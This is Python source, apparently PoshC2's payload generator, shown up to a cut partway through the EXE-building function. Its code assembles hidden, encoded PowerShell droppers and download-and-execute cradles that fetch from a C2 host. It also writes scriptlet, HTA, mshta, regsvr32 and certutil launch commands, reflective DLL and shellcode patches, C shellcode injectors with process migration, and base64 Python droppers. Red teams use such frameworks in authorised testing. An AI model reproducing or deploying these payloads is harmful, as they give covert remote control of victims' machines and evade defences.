from io import StringIO
import gzip, base64, subprocess, os, hashlib

from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
from poshc2.Colours import Colours
from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import get_url_by_id, get_default_url_id, select_item
else:
    from poshc2.server.database.DBSQLite import get_url_by_id, get_default_url_id, select_item


class Payloads(object):

    quickstart = None

    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = "", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret):        

        if not URLID:
            URLID = get_default_url_id()

        self.URLID = URLID
        urlDetails = get_url_by_id(self.URLID)
        self.KillDate = KillDate
        self.Key = Key
        self.QuickCommand = select_item("QuickCommand", "C2Server")
        self.DomainFrontHeader = urlDetails[3]
        self.PayloadCommsHost = urlDetails[2]
        self.Proxyuser = urlDetails[4]
        self.Proxypass = urlDetails[5]
        self.Proxyurl = urlDetails[6]
        self.PowerShellProxyCommand = PowerShellProxyCommand
        self.ImplantType = ImplantType
        self.Insecure = Insecure
        self.UserAgent = UserAgent
        self.Referrer = Referrer
        self.ConnectURL = ConnectURL
        self.BaseDirectory = BaseDirectory
        self.PBindPipeName = PBindPipeName if PBindPipeName else DefaultPBindPipeName
        self.PBindSecret = PBindSecret if PBindSecret else DefaultPBindSecret
        self.BaseDirectory = BaseDirectory
        self.PSDropper = ""
        self.PyDropper = ""
        if os.path.exists("%saes.py" % PayloadsDirectory):
            with open("%saes.py" % PayloadsDirectory, 'r') as f:
                content = f.read()
                import re
                m = re.search('#KEY(.+?)#KEY', content)
                if m:
                    keyfound = m.group(1)
                self.PyDropperHash = hashlib.sha512(content.encode("utf-8")).hexdigest()
                self.PyDropperKey = keyfound
        else:
            self.PyDropperKey = str(gen_key().decode("utf-8"))
            randomkey = self.PyDropperKey
            with open("%saes.py" % PayloadTemplatesDirectory, 'r') as f:
                content = f.read()
            aespy = str(content).replace("#REPLACEKEY#", "#KEY%s#KEY" % randomkey)
            filename = "%saes.py" % (self.BaseDirectory)
            output_file = open(filename, 'w')
            output_file.write(aespy)
            output_file.close()
            self.PyDropperHash = hashlib.sha512((aespy).encode('utf-8')).hexdigest()

        cs = str(content).replace("#REPLACEKILLDATE#", self.KillDate)
        cs1 = cs.replace("#REPLACEPYTHONHASH#", self.PyDropperHash)
        cs2 = cs1.replace("#REPLACESPYTHONKEY#", self.PyDropperKey)
        cs3 = cs2.replace("#REPLACEKEY#", self.Key)
        cs4 = cs3.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + self.QuickCommand + "_py")
        cs6 = cs5.replace("#REPLACECONNECTURL#", self.PayloadCommsHost + self.ConnectURL + "?m")
        cs7 = cs6.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
        cs8 = cs7.replace("#REPLACEUSERAGENT#", self.UserAgent)
        cs8 = cs8.replace("#REPLACEURLID#", str(self.URLID))

        with open("%sdropper.ps1" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()

        cs = str(content).replace("#REPLACEINSECURE#", self.Insecure)
        cs1 = cs.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
        cs2 = cs1.replace("#REPLACEIMPTYPE#", (self.PayloadCommsHost + self.ConnectURL + self.ImplantType))
        cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
        cs4 = cs3.replace("#REPLACEPROXYUSER#", self.Proxyuser)
        cs5 = cs4.replace("#REPLACEPROXYPASS#", self.Proxypass)
        cs6 = cs5.replace("#REPLACEPROXYURL#", self.Proxyurl)
        cs7 = cs6.replace("#REPLACEPROXYCOMMAND#", self.PowerShellProxyCommand)
        cs8 = cs7.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
        cs9 = cs8.replace("#REPLACECONNECT#", self.ConnectURL)
        cs10 = cs9.replace("#REPLACEUSERAGENT#", self.UserAgent)
        cs11 = cs10.replace("#REPLACEREFERER#", self.Referrer)
        cs11 = cs11.replace("#REPLACEURLID#", str(self.URLID))
        self.PSDropper = cs11.replace("#REPLACEKEY#", self.Key)
        print()

    def QuickstartLog(self, txt):
        if not self.quickstart:
            self.quickstart = ''
        print(Colours.GREEN + txt)
        self.quickstart += txt + '\n'

    def WriteQuickstart(self, path):
        with open(path, 'w') as f:
            f.write(self.quickstart + Colours.END)
            print("")
            print(Colours.END + 'Quickstart written to ' + path + Colours.GREEN)

    def CreateRawBase(self, full=False):
        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload
        if full:
            return batfile
        else:
            return base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")

    def CreateRaw(self, name=""):
        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
        filename = "%s%spayload.txt" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(self.PSDropper)
        output_file.close()
        self.QuickstartLog("Raw Payload written to: %s" % filename)
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE'))
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload.decode("utf-8")
        filename = "%s%spayload.bat" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(batfile)
        output_file.close()
        self.QuickstartLog("Batch Payload written to: %s" % filename)

    def CreateDroppers(self, name=""):
        # Create Sharp DLL
        with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        cs = str(content).replace("#REPLACEKEY#", self.Key)
        cs1 = cs.replace("#REPLACEBASEURL#", self.PayloadCommsHost)
        cs2 = cs1.replace("#REPLACESTARTURL#", (self.PayloadCommsHost + self.ConnectURL + "?c"))
        cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
        cs4 = cs3.replace("#REPLACEDF#", self.DomainFrontHeader)
        cs5 = cs4.replace("#REPLACEUSERAGENT#", self.UserAgent)
        cs6 = cs5.replace("#REPLACEREFERER#", self.Referrer)
        cs7 = cs6.replace("#REPLACEPROXYURL#", self.Proxyurl)
        cs8 = cs7.replace("#REPLACEPROXYUSER#", self.Proxyuser)
        cs9 = cs8.replace("#REPLACEPROXYPASSWORD#", self.Proxypass)
        cs9 = cs9.replace("#REPLACEURLID#", str(self.URLID))

        self.QuickstartLog("C# Dropper Payload written to: %s%sdropper.cs" % (self.BaseDirectory, name))
        filename = "%s%sdropper.cs" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(str(cs9))
        output_file.close()
        if os.name == 'nt':
            compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs.dll %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
            compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs.exe %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
        else:
            compile = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name)
            compileexe = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name)
        subprocess.check_output(compile, shell=True)
        self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory, name))
        subprocess.check_output(compileexe, shell=True)
        self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory, name))

        # Create PBind Sharp DLL
        with open("%spbind.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        cs = str(content).replace("#REPLACEKEY#", self.Key)
        cs = cs.replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName)
        cs = cs.replace("#REPLACEPBINDSECRET#", self.PBindSecret)

        self.QuickstartLog(f"C# PBind Dropper Payload written to: %s%spbind.cs with pipe name: {self.PBindPipeName} and secret: {self.PBindSecret}" % (self.BaseDirectory, name))
        filename = "%s%spbind.cs" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(str(cs))
        output_file.close()
        if os.name == 'nt':
            compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%spbind_cs.dll %s%spbind.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
            compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%spbind_cs.exe %s%spbind.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
        else:
            compile = "mono-csc %s%spbind.cs -out:%sPB.dll -target:library -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory)
            compileexe = "mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory)
        subprocess.check_output(compile, shell=True)
        self.QuickstartLog("C# PBind Dropper DLL written to: %s%spbind_cs.dll" % (self.BaseDirectory, name))
        subprocess.check_output(compileexe, shell=True)
        self.QuickstartLog("C# PBind Dropper EXE written to: %s%spbind_cs.exe" % (self.BaseDirectory, name))
        os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
        os.rename("%sPB.dll" % (self.BaseDirectory), "%s%spbind_cs.dll" % (self.BaseDirectory, name))
        self.QuickstartLog("")
        if self.PBindPipeName != DefaultPBindPipeName or self.PBindSecret != DefaultPBindSecret:
            self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
        else:
            self.QuickstartLog("pbind-connect hostname")

    def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
        filename = "%s%s" % (self.BaseDirectory, filename)
        output_file = open(filename, 'wb')
        output_file.write(base64.b64decode(dll))
        output_file.close()
        srcfilename = ""

        if payloadtype == "Posh":
            out = StringIO()
            data = bytes(self.PSDropper, 'utf-8')
            out = gzip.compress(data)
            gzipdata = base64.b64encode(out).decode("utf-8")
            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
            patch = payload.decode("utf-8")
            patchlen = 8000 - len(patch)

        elif payloadtype == "Sharp":
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
            with open(srcfilename, "rb") as b:
                dllbase64  = base64.b64encode(b.read()).decode("utf-8")
            patchlen = 32000 - len((dllbase64))
            patch = dllbase64 

        elif payloadtype == "PBind":
            out = StringIO()
            with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
                pbind = f.read()
            pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
            data = bytes(pbind, 'utf-8')
            out = gzip.compress(data)
            gzipdata = base64.b64encode(out).decode("utf-8")
            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
            patch = payload.decode("utf-8")
            patchlen = 8000 - len(patch)

        elif payloadtype == "PBindSharp":
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")
            with open(srcfilename, "rb") as b:
                dllbase64 = base64.b64encode(b.read()).decode("utf-8")
            patchlen = 32000 - len((dllbase64))
            patch = dllbase64 

        patch2 = ""
        patch2 = patch2.ljust(patchlen, '\x00')
        patch3 = "%s%s" % (patch, patch2)

        f = open(filename, "r+b")
        f.seek(offset)
        f.write(bytes(patch3, 'UTF-16LE'))
        f.close()

        self.QuickstartLog("Payload written to: %s" % (filename))

    def CreateDll(self, DestinationFile, ResourceFile, payloadtype, name=""):                
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)

    def CreateShellcodeFile(self, DestinationFile, DestinationFileB64, ResourceFile, payloadtype, name=""):        
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
        with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
            with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
                b64.write(base64.b64encode(binary.read()))

    def CreateDlls(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("ReflectiveDLL that loads CLR v2.0.50727 - DLL Export (VoidFunc)" + Colours.GREEN)
        self.CreateDll(f"{name}Posh_v2_x86.dll", f"{PayloadTemplatesDirectory}Posh_v2_x86_dll.b64", "Posh", name)
        self.CreateDll(f"{name}Posh_v2_x64.dll", f"{PayloadTemplatesDirectory}Posh_v2_x64_dll.b64", "Posh",name)

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("ReflectiveDLL that loads CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
        self.CreateDll(f"{name}Posh_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", "Posh", name)
        self.CreateDll(f"{name}Posh_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", "Posh", name)
        self.CreateDll(f"{name}Sharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", "Sharp", name)
        self.CreateDll(f"{name}Sharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", "Sharp", name)
        self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", "PBind", name)
        self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", "PBind", name)
        self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", "PBindSharp", name)
        self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", "PBindSharp", name)

    def CreateShellcode(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Shellcode that loads CLR v2.0.50727" + Colours.GREEN)
        self.CreateShellcodeFile(f"{name}Posh_v2_x86_Shellcode.bin", f"{name}Posh_v2_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x86_Shellcode.b64", "Posh", name)
        self.CreateShellcodeFile(f"{name}Posh_v2_x64_Shellcode.bin", f"{name}Posh_v2_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x64_Shellcode.b64", "Posh", name)
        
        self.QuickstartLog(Colours.END)
        self.QuickstartLog(f"Shellcode that loads CLR v4.0.30319" + Colours.GREEN)
        self.CreateShellcodeFile(f"{name}Posh_v4_x86_Shellcode.bin", f"{name}Posh_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", "Posh", name)
        self.CreateShellcodeFile(f"{name}Posh_v4_x64_Shellcode.bin", f"{name}Posh_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", "Posh", name)
        self.CreateShellcodeFile(f"{name}Sharp_v4_x86_Shellcode.bin", f"{name}Sharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", "Sharp", name)
        self.CreateShellcodeFile(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", "Sharp", name)
        self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", "PBind", name)
        self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", "PBind", name)
        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", "PBindSharp", name)
        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", "PBindSharp", name)

    def CreateSCT(self):
        basefile = self.CreateRawBase()
        raw1 = """<?XML version="1.0"?>
<scriptlet>

<registration
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

<script language="VBScript">
Dim ghgfhgfh
set ghgfhgfh = CreateObject("shell.application")
ghgfhgfh.ShellExecute "powershell.exe", " -exec bypass -Noninteractive -windowstyle hidden -e %s", "", "open", 0
</script>

</registration>
</scriptlet>
""" % basefile

        raw2 = """<sCrIptlEt><scRIPt>
a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec bypass -Noninteractive -windowstyle hidden -e %s","","open","0");
</scRIPt></sCrIptlEt>
""" % basefile
        filename = "%srg_sct.xml" % (self.BaseDirectory)
        output_file = open(filename, 'w')
        output_file.write(raw1)
        filename = "%scs_sct.xml" % (self.BaseDirectory)
        output_file.close()
        output_file = open(filename, 'w')
        output_file.write(raw2)
        output_file.close()

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Execution via Command Prompt" + Colours.GREEN)

        psuri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rp"
        pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
        psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_cs"

        # only run if the domainfrontheader is null
        if self.DomainFrontHeader:
            self.QuickstartLog("powershell small one liner does not work with domain fronting")
        else:
            self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Other Execution Methods" + Colours.GREEN)
        self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri)
        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rg"
        self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % uri)
        self.QuickstartLog("")

    def CreateHTA(self):
        basefile = self.CreateRawBase(full=True)
        hta = """<script>
ao=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"Sh"+"e"+"l"+"l");
ao.run('%s', 0);window.close();
</script>""" % basefile
        self.QuickstartLog("HTA Payload written to: %sLauncher.hta" % self.BaseDirectory)
        filename = "%sLauncher.hta" % (self.BaseDirectory)
        output_file = open(filename, 'w')
        output_file.write(hta)
        output_file.close()

    def CreateCS(self, name=""):
        basefile = self.CreateRawBase()
        with open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        cs = content.replace("#REPLACEME#", str(basefile))
        self.QuickstartLog("CS Powershell Stager source written to: %s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name))
        filename = "%s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(cs)
        output_file.close()
        if os.name == 'nt':
            compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs_ps.dll %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
            compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs_ps.exe %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
        else:
            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory)
        subprocess.check_output(compile, shell=True)
        self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
        subprocess.check_output(compileexe, shell=True)
        self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
        with open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r') as f:
            dotnet = f.read()        
        with open('%s%sPosh_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_64 = f.read()
        with open('%s%sPosh_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_86 = f.read()
        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8'))        
        self.QuickstartLog("DotNet2JS Powershell Payload written to: %s%sDotNet2JS.js" % (self.BaseDirectory, name))
        filename = "%s%sDotNet2JS.js" % (self.BaseDirectory, name)
        filenameb64 = "%s%sDotNet2JS.b64" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(dotnet)
        output_file.close()  
        output_file = open(filenameb64, 'w')
        output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
        output_file.close()  
        with open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r') as f:
            dotnet = f.read()        
        with open('%s%sSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_64 = f.read()
        with open('%s%sSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_86 = f.read()
        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8')) 
        self.QuickstartLog("DotNet2JS C# Payload written to: %s%sDotNet2JS_CS.js" % (self.BaseDirectory, name))
        filename = "%s%sDotNet2JS_CS.js" % (self.BaseDirectory, name)
        filenameb64 = "%s%sDotNet2JS_CS.b64" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(dotnet)
        output_file.close() 
        output_file = open(filenameb64, 'w')
        output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
        output_file.close()   
        with open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r') as f:
            dotnet = f.read()        
        with open('%s%sPBind_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_64 = f.read()
        with open('%s%sPBind_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
            v4_86 = f.read()
        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8')) 
        self.QuickstartLog("DotNet2JS PBind Payload written to: %s%sDotNet2JS_PBind.js" % (self.BaseDirectory, name))
        filename = "%s%sDotNet2JS_PBind.js" % (self.BaseDirectory, name)
        filenameb64 = "%s%sDotNet2JS_PBind.b64" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(dotnet)
        output_file.close() 
        output_file = open(filenameb64, 'w')
        output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
        output_file.close()           


    def CreatePython(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("OSX/Unix Python Payload:" + Colours.GREEN)
        with open("%sdropper.py" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        cs = str(content).replace("#REPLACEKILLDATE#", self.KillDate)
        cs1 = cs.replace("#REPLACEPYTHONHASH#", self.PyDropperHash)
        cs2 = cs1.replace("#REPLACESPYTHONKEY#", self.PyDropperKey)
        cs3 = cs2.replace("#REPLACEKEY#", self.Key)
        cs4 = cs3.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + self.QuickCommand + "_py")
        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.PayloadCommsHost + self.ConnectURL + "?m"))
        cs7 = cs6.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
        cs7 = cs7.replace("#REPLACEURLID#", str(self.URLID))
        self.PyDropper = cs7.replace("#REPLACEUSERAGENT#", self.UserAgent)
        py = base64.b64encode(self.PyDropper.encode('UTF-8'))
        pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python2 &" % py.decode('UTF-8')
        filename = "%s%spy_dropper.sh" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(pydropper_bash)
        output_file.close()
        self.QuickstartLog("Python2 Dropper written to: %spy_dropper.sh" % self.BaseDirectory)

        pydropper_python = "import sys,base64;exec(base64.b64decode('%s'));" % py.decode('UTF-8')
        filename = "%s%spy_dropper.py" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(pydropper_python)
        output_file.close()

    def CreateEXE(self, name=""):
        with open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
            sc64 = f.read()
        hexcode = "".join("\\x{:02x}".format(c) for c in sc64)
        sc64 = formStr("char sc[]", hexcode)

        with open("%sShellcode_Injector.c" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        ccode = str(content).replace("#REPLACEME#", str(sc64))
        self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64.exe" % (self.BaseDirectory, name))
        filename = "%s%sPosh64.c" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(ccode)
        output_file.close()

        with open("%sShellcode_Injector_Migrate.c" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        ccode = str(content).replace("#REPLACEME#", str(sc64))
        migrate_process = DefaultMigrationProcess
        if "\\" in migrate_process and "\\\\" not in migrate_process:
            migrate_process = migrate_process.replace("\\", "\\\\")
        ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
        self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64_migrate.exe" % (self.BaseDirectory, name))
        filename = "%s%sPosh64_migrate.c" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(ccode)
        output_file.close()

        with open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as f:
            sc32 = f.read()
        hexcode = "".join("\\x{:02x}".format(c) for c in sc32)
        sc32 = formStr("char sc[]", hexcode)

        with open("%sShellcode_Injector.c" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        ccode = str(content).replace("#REPLACEME#", str(sc32))
        self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32.exe" % (self.BaseDirectory, name))
        filename = "%s%sPosh32.c" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(ccode)
        output_file.close()

        with open("%sShellcode_Injector_Migrate.c" % PayloadTemplatesDirectory, 'r') as f:
            content = f.read()
        ccode = str(content).replace("#REPLACEME#", str(sc32))
        ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
        self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32_migrate.exe" % (self.BaseDirectory, name))
        filename = "%s%sPosh32_migrate.c" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(ccode)
        output_file.close()

        try:
            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex64"
            filename = randomuri()
            self.QuickstartLog(Colours.END)
            self.QuickstartLog("Download Posh64 & Posh32 executables using certutil:" + Colours.GREEN)
            self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri, filename))
            if os.name == 'nt':
                compile64 = "C:\\TDM-GCC-64\\bin\\gcc.exe %s%sPosh64.c -o %s%sPosh64.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
